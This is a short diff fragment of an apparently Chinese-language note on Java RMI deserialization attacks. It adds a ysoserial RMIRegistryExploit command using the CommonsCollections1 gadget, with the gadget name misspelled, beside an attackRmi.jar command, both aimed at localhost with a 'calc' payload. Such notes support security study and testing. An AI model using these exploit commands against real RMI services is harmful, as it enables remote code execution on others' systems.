@@ -87,6 +87,7 @@ jdk版本低
 
 ```java
 java -jar attackRmi.jar DOL 127.0.0.1 6666 'calc'
+java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 6666 CommonsColections1 "calc"
 ```
 jdk高bypass jep  
 ```
